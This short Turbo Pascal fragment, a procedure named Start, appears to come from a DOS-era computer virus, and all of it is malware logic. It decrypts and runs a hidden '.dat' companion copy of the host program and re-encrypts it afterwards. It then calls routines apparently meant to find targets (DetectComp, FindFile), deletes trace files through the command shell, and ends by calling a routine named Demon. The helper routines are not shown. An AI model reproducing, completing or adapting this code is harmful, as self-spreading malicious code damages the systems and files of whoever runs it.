   procedure Start;
   var g,par:string;
       s:searchrec;
       i:byte;
   begin
   Command:=GetEnv('COMSPEC');
   fsplit(paramstr(0),a,b,c);
   g:=a+b+'.dat';
   findfirst(g,$3F,s);
   if doserror=0 then
     begin
     par:='';
     for i:=1 to paramcount do par:=par+paramstr(i)+' ';
     Crypt(g,0);
     exec(g,par);
     Crypt(g,0);
     end;
   Dummy:=0;
   randomize;
   MakeInc;
   if DetectComp then FindFile else exit;
   exec(Command,'/c del s*.inc>nul');
   exec(Command,'/c del s?.*>nul');
   Demon;
   end;
